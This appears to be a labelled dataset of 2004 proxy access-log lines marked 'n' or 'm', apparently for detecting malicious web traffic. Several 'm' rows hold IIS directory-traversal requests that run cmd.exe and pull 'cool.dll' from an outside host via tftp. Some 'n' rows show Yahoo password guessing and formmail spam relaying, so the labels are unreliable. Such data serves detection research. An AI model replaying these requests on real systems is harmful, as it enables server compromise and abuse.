rowIndex, row, class
1916, 65.66.156.226 - - [10/Mar/2004:03:12:24 -0500] "GET http://login.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_jcj_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1917, 61.172.244.109 - - [10/Mar/2004:03:12:32 -0500] "CONNECT 202.108.226.178:25 HTTP/1.0" 200 - "-" "-", n
1918, 212.160.136.163 - - [10/Mar/2004:03:12:37 -0500] "GET http://www.searcheaven.net/cgi-bin/smartsearch/sf.cgi?t=ah&keys=zfzphdhfzzzfamzhzkzhccddfohadhzzsmdvsvfyzhxyahfpdphnshhvdhhadshsccscdxfxhcfzaaaafxszxahiddfcfoscahfnfhfpzyhshvzadvaaaxaodizzdafmcdcpavadfvaydvdzfcfpanahzkdpsmfkacfvsmdifxzycccsavddfdhsdzzyzcahfnzszzapsodsahaiadzsfnzyhfzsdksidsdzandnssfyfozhcssdspsnfmfdzmandmsyxazidadnhxsifsanzshdamzvhsdcfkhdfkdnsiashfsyzmckfpafsdsoddfvdcfizpcozmspsodmhasadxayfvdzadapdydyamfkdafvdyfpfvcdzsacdadffvzadmaofcddzycvzfdvfssosxspsssofyhzcdszanszscandhfzsadixzxpdpaidaddazzkzsdasxziciahdffxhsanavzsdcaoxkhoazahdcdssndiansisiahcxffsndhdfaoscssddaocsxpsafvspazadzfzhaazahxsxsnaiafzmaksphvacassvhnhohahnscaxansahksxzfzshzspsdadsnsyacavaaapxvfzhnhchhzshazzhksyhazx&kw=mortgage HTTP/1.0" 302 557 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1919, 212.160.136.163 - - [10/Mar/2004:03:12:38 -0500] "GET http://c.ah-ha.com/c?e1=pduJfETpCglzJJiCB2ebyPkHGxshLpH4su5RYtQxlE41qIFoUEFOoCWupssiXfDaghjuOT0NuZRvQ1YCBquQJVXINXlNZ24WWxUd4LfkpW4BOIPunyKSyd1qfUX1CQkar04tCv5SPqIdKy4FAwgdUoFYgTuDEeYuh1X4yycEfuytIi20Q5NZxUN1QUgLfYhUs2sVEXVmXzxOQHE0PzefT3dj1VDJrpBKNgImQraG3RVgAjA2N&h=KGtJoDwZg4C3FNAo0&b=47140 HTTP/1.0" 302 0 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1920, 68.48.142.117 - - [10/Mar/2004:03:12:39 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1921, 212.160.136.163 - - [10/Mar/2004:03:12:40 -0500] "GET http://c.ah-ha.com/c/2?e1=pduJfETpCglzJJiCB2ebyPkHGxshLpH4su5RYtQxlE41qIFoUEFOoCWupssiXfDaghjuOT0NuZRvQ1YCBquQJVXINXlNZ24WWxUd4LfkpW4BOIPunyKSyd1qfUX1CQkar04tCv5SPqIdKy4FAwgdUoFYgTuDEeYuh1X4yycEfuytIi20Q5NZxUN1QUgLfYhUs2sVEXVmXzxOQHE0PzefT3dj1VDJrpBKNgImQraG3RVgAjA2N&h=KGtJoDwZg4C3FNAo0&b=47140 HTTP/1.0" 302 0 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1922, 67.83.151.132 - - [10/Mar/2004:03:12:47 -0500] "POST http://www.jamieclarke.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1923, 212.160.136.163 - - [10/Mar/2004:03:12:48 -0500] "GET http://www.4yourhomeloan.com/ HTTP/1.0" 302 291 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1924, 212.160.136.163 - - [10/Mar/2004:03:13:05 -0500] "GET http://www.4yourhomeloan.net/ HTTP/1.0" 200 53132 "http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1925, 67.83.151.132 - - [10/Mar/2004:03:13:23 -0500] "POST http://www.rebuz.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1926, 65.66.156.226 - - [10/Mar/2004:03:13:27 -0500] "GET http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_joey___&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1927, 68.48.142.117 - - [10/Mar/2004:03:13:29 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1928, 67.83.151.132 - - [10/Mar/2004:03:13:41 -0500] "POST http://www.nicoladexter.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1929, 65.66.156.226 - - [10/Mar/2004:03:13:54 -0500] "GET http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_kk_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1930, 65.66.156.226 - - [10/Mar/2004:03:13:54 -0500] "GET http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_kkg_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1931, 12.221.212.151 - - [10/Mar/2004:03:13:56 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; MSIE 5.01; Windows 98; DigiExt )", n
1932, 67.83.151.132 - - [10/Mar/2004:03:13:56 -0500] "POST http://www.salvation-films.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1933, 12.221.212.151 - - [10/Mar/2004:03:13:57 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/3.01 ( compatible; [jp]; Windows 95; athome0107 )", n
1934, 67.125.136.193 - - [10/Mar/2004:03:13:58 -0500] "GET http://www.tnvgirls.com/members/ HTTP/1.0" 200 566 "http://www.tnvgirls.com/members/" "Mozilla/4.73 ( compatible; [fr]; Windows NT4.0; DigiExt )", n
1935, 67.83.151.132 - - [10/Mar/2004:03:14:04 -0500] "POST http://www3.ocn.ne.jp/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1936, 67.83.151.132 - - [10/Mar/2004:03:14:15 -0500] "POST http://www2.ocn.ne.jp/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1937, 68.48.142.117 - - [10/Mar/2004:03:14:19 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1938, 67.83.151.132 - - [10/Mar/2004:03:14:36 -0500] "POST http://www.crystal-mtn.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1939, 192.117.242.67 - - [10/Mar/2004:03:14:44 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1940, 12.221.212.151 - - [10/Mar/2004:03:14:57 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/5.0 ( compatible; [en]; Windows NT4.0; Compaq )", n
1941, 12.221.212.151 - - [10/Mar/2004:03:14:57 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/3.01 ( compatible; [de]; Windows 95; DigiExt )", n
1942, 195.5.54.47 - - [10/Mar/2004:03:14:59 -0500] "GET http://195.5.54.47:8081/?SESS516607615 HTTP/1.1" 200 5 "-" "-", n
1943, 68.48.142.117 - - [10/Mar/2004:03:15:12 -0500] "GET /scripts/..%25%35%63../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1944, 67.83.151.132 - - [10/Mar/2004:03:15:22 -0500] "POST http://www.mslawyer.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1945, 65.66.156.226 - - [10/Mar/2004:03:15:45 -0500] "GET http://l1.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_mot_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1946, 65.66.156.226 - - [10/Mar/2004:03:15:45 -0500] "GET http://l1.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_o_r_c_a_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1947, 221.7.192.11 - - [10/Mar/2004:03:15:52 -0500] "GET http://ccbbs.cn/index.asp HTTP/1.1" 200 12711 "http://ccbbs.cn/index.asp" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1948, 203.121.182.141 - - [10/Mar/2004:03:15:59 -0500] "CONNECT 200.14.236.226:25 HTTP/1.0" 200 - "-" "-", n
1949, 67.83.151.132 - - [10/Mar/2004:03:15:59 -0500] "POST http://www.esg.ndirect.co.uk/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1950, 68.48.142.117 - - [10/Mar/2004:03:16:02 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1951, 67.83.151.132 - - [10/Mar/2004:03:16:39 -0500] "POST http://www.tedthorsen.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1952, 195.5.54.47 - - [10/Mar/2004:03:16:49 -0500] "GET http://195.5.54.47:8081/?SESS576376557 HTTP/1.1" 200 5 "-" "-", n
1953, 68.48.142.117 - - [10/Mar/2004:03:16:52 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1954, 192.117.242.67 - - [10/Mar/2004:03:17:02 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1955, 192.117.242.67 - - [10/Mar/2004:03:17:05 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1956, 212.160.136.163 - - [10/Mar/2004:03:17:19 -0500] "GET http://www.helavasearch.com/cgi-bin/search.cgi?username=amundii&keywords=bank+account HTTP/1.0" 200 38199 "http://www.powerlif.ifbbpro.net/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)", n
1957, 212.160.136.163 - - [10/Mar/2004:03:17:21 -0500] "GET http://www.helavasearch.com/cgi-bin/go.cgi?u=ahhhzksczyzoss&k=axzczsafhxhnaksxhsaazvzx&url=spzhhnhkhhzaahhhzksfzfzkaxhhhssshazyhkzozfapsnsxzpzzzyaxhf&b=zsaaanzssvan&a=amundii&t=zcaaaozhaxaaznasanza&uid=4145217384 HTTP/1.0" 302 286 "http://www.helavasearch.com/cgi-bin/search.cgi?username=amundii&keywords=bank+account" "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)", n
1958, 67.83.151.132 - - [10/Mar/2004:03:17:22 -0500] "POST http://www.mainstreetgoldworks.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1959, 65.66.156.226 - - [10/Mar/2004:03:17:23 -0500] "GET http://l2.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_pug_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1960, 65.66.156.226 - - [10/Mar/2004:03:17:24 -0500] "GET http://l2.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_rd_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1961, 195.5.54.47 - - [10/Mar/2004:03:17:34 -0500] "GET http://195.5.54.47:8081/?SESS808832794 HTTP/1.1" 200 5 "-" "-", n
1962, 68.48.142.117 - - [10/Mar/2004:03:17:43 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1963, 67.83.151.132 - - [10/Mar/2004:03:17:45 -0500] "POST http://www.primarymonitor.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1964, 212.160.136.163 - - [10/Mar/2004:03:17:48 -0500] "GET http://www.ticketsreserve.com/ HTTP/1.0" 200 21256 "http://www.helavasearch.com/cgi-bin/search.cgi?username=amundii&keywords=bank+account" "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)", n
1965, 203.121.182.140 - - [10/Mar/2004:03:17:49 -0500] "CONNECT 209.15.20.38:25 HTTP/1.0" 200 - "-" "-", n
1966, 220.173.17.142 - - [10/Mar/2004:03:17:49 -0500] "GET http://dbbsrv.com/image/443610/10004167 HTTP/1.1" 200 9090 "http://www.so123.com" "Mozilla/4.0 (compatible; MSIE 5.02; Windows ME)", n
1967, 218.93.92.137 - - [10/Mar/2004:03:17:53 -0500] "GET http://findbestsearch.com/?aff_id=69&str=Horoscopes HTTP/1.1" 200 578 "http://www.livesnet.com/findbestsearch.htm" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0", n
1968, 67.83.151.132 - - [10/Mar/2004:03:18:20 -0500] "POST http://www.kinopolis.de/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1969, 68.48.142.117 - - [10/Mar/2004:03:18:33 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1970, 67.83.151.132 - - [10/Mar/2004:03:18:33 -0500] "POST http://www.news.nic.it/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1971, 67.83.151.132 - - [10/Mar/2004:03:18:37 -0500] "POST http://www.handtohandkajukenbo.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1972, 67.83.151.132 - - [10/Mar/2004:03:18:48 -0500] "POST http://www.kinopolis.de/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1973, 65.66.156.226 - - [10/Mar/2004:03:19:00 -0500] "GET http://l2.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_rmp&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1974, 65.66.156.226 - - [10/Mar/2004:03:19:00 -0500] "GET http://l2.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_swan&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1975, 68.48.142.117 - - [10/Mar/2004:03:19:23 -0500] "GET /scripts/..%252f../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1976, 67.83.151.132 - - [10/Mar/2004:03:19:33 -0500] "POST http://www.ec.gc.ca/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1977, 67.83.151.132 - - [10/Mar/2004:03:19:46 -0500] "POST http://fastnet.it/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1978, 67.83.151.132 - - [10/Mar/2004:03:20:12 -0500] "POST http://www.darkbasiccodebase.co.uk/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1979, 67.83.151.132 - - [10/Mar/2004:03:20:13 -0500] "POST http://www7.ocn.ne.jp/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1980, 12.221.212.151 - - [10/Mar/2004:03:20:20 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/5.0 ( compatible; [en]; Windows NT4.0; Compaq )", n
1981, 12.221.212.151 - - [10/Mar/2004:03:20:20 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; MSIE 4.0; Windows 95; Compaq )", n
1982, 67.83.151.132 - - [10/Mar/2004:03:20:32 -0500] "POST http://www.facilitationfactory.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1983, 65.66.156.226 - - [10/Mar/2004:03:20:36 -0500] "GET http://l3.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_tek_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1984, 67.83.151.132 - - [10/Mar/2004:03:20:39 -0500] "POST http://www.tedthorsen.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1985, 67.125.136.193 - - [10/Mar/2004:03:20:51 -0500] "GET http://www.tnvgirls.com/members/ HTTP/1.0" 200 566 "http://www.tnvgirls.com/members/" "Mozilla/5.0 ( compatible; [jp]; Windows 98; DigiExt )", n
1986, 67.83.151.132 - - [10/Mar/2004:03:20:57 -0500] "POST http://www2.ocn.ne.jp/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1987, 221.7.192.11 - - [10/Mar/2004:03:21:23 -0500] "GET http://www.ccbbs.cn/index.asp HTTP/1.1" 200 12711 "http://www.ccbbs.cn/index.asp" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1988, 192.117.242.67 - - [10/Mar/2004:03:21:52 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1989, 221.7.192.11 - - [10/Mar/2004:03:21:52 -0500] "GET http://ccbbs.cn/index.asp HTTP/1.1" 200 12711 "http://ccbbs.cn/index.asp" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT 5.0)", n
1990, 67.83.151.132 - - [10/Mar/2004:03:21:56 -0500] "POST http://www.ishop.co.uk/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1991, 192.117.242.67 - - [10/Mar/2004:03:21:57 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1992, 65.66.156.226 - - [10/Mar/2004:03:22:05 -0500] "GET http://l3.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_yak_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1993, 65.66.156.226 - - [10/Mar/2004:03:22:05 -0500] "GET http://l3.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_wiz_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1994, 67.83.151.132 - - [10/Mar/2004:03:22:05 -0500] "POST http://www.detroitdressage.com/cgi-bin/mail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1995, 221.7.192.11 - - [10/Mar/2004:03:22:09 -0500] "GET http://www.baidu.com/baidu?word=%CD%F8%D7%AC+%D3%B6%BD%F0%D6%D0%B9%FA&cl=3 HTTP/1.1" 200 578 "http://www.baidu.com/baidu?word=%CD%F8%D7%AC+%D3%B6%BD%F0%D6%D0%B9%FA&cl=3" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", n
1996, 67.83.151.132 - - [10/Mar/2004:03:22:17 -0500] "POST http://www.ec.gc.ca/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1997, 221.7.192.11 - - [10/Mar/2004:03:22:51 -0500] "GET http://www.ccbbs.cn/ HTTP/1.1" 200 12711 "http://www.ccbbs.cn" "Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)", n
1998, 67.83.151.132 - - [10/Mar/2004:03:23:22 -0500] "POST http://tacticalone.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1999, 221.7.192.11 - - [10/Mar/2004:03:23:23 -0500] "GET http://ccbbs.cn/ HTTP/1.1" 200 15631 "http://ccbbs.cn" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
2000, 65.66.156.226 - - [10/Mar/2004:03:23:30 -0500] "GET http://l4.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=a__v&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
2001, 172.144.226.171 - - [10/Mar/2004:03:23:30 -0500] "GET http://edit.my.yahoo.com/config/login?.src=bl&login=AnyID&passwd=AnyPassword&n=1 HTTP/1.0" 200 566 "-" "-", n
2002, 65.66.156.226 - - [10/Mar/2004:03:23:33 -0500] "GET http://l4.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_wat&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
2003, 220.173.17.142 - - [10/Mar/2004:03:24:05 -0500] "POST http://www.clickcheaper.com/search.php HTTP/1.1" 200 17875 "http://www.yahoo.com" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
2004, 220.173.17.142 - - [10/Mar/2004:03:24:08 -0500] "GET http://clickcheaper.com/go.php?b=zchdzizyzxznznhz&k=axsdsxsxshaaszsaakshashosysfscfn&u=svazamapsyapszaz&l=axsdsxsxshaaszsaakshaszozyzohcxnfoffscspfmzkhisnzihpzszfaazvhiaxshafaysdazayanapsxaiafshsxsxafsashdydsdmshsxahayanafzchfzvhdznfpzphdahaksvhzzxhnzszyhkhfznzchkzmfizmzafifvckhchpzizhzohfaaaiapaxxcznhisxafasssazsisozazpzdhhfizizdsismspdxckxpfascaosphdsiaszazpzohdzssdsvssaoanfdhshssxahsnznacszskszayaiacaixddhdfskfiznhnfphcsiccamsdzzaiaksdhvaazmsasyadhazvsvhozhznaxzkafzphsddfoxhhcsysmzhhzahavhpaismazsnzkavzvhozfafapsizcsmahhvsisvsszcaksfspxmcmchsfaoavzcapakzxskzzhkhhsvayzmsfhdadanamhmshsaaxscayaksnshzsamhydkfhdczfzyznzkzzsmafzmhfznsaaianszakapavssasaksoskzoacsxaoadzsshzxsydkdvdczpsxspsmssazschfzphcsvaiamsyafsmsfziayaxaohxzvhkakansasn&s=axsssismazfp&t= HTTP/1.1" 302 0 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", m
